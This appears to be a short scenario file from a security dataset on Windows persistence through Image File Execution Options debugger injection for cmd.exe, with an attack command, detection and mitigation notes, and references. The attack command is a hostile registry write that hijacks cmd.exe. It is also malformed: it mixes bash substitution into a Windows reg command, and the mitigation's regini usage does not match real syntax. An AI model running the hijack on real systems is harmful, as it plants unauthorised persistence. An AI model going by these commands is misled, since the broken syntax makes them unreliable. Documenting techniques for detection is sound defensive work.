---
type: campaign
scenario_id: 92
tactic: Persistence
technique: "T1546.012: Image File Execution Options Injection"
technique_id: T1546.012
tags: [campaign, lotl, persistence]
---

# Injecting malicious debugger into IFEO for specific process.

## Threat Description
Injecting malicious debugger into IFEO for specific process.

## Attack Command
```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe" /v Debugger /t REG_SZ /d "$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)"
```

## Detection Logic
Monitor IFEO changes: `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe"`; Event ID 4657.

## Mitigation
Restrict IFEO writes: `regini -h deny "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"`; Enable registry auditing.

## AI Training Prompt
Train AI to detect IFEO debugger injections for cmd.exe and suggest registry protections.

## References
- MITRE ATT&CK T1546.012: https://attack.mitre.org/techniques/T1546/012/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
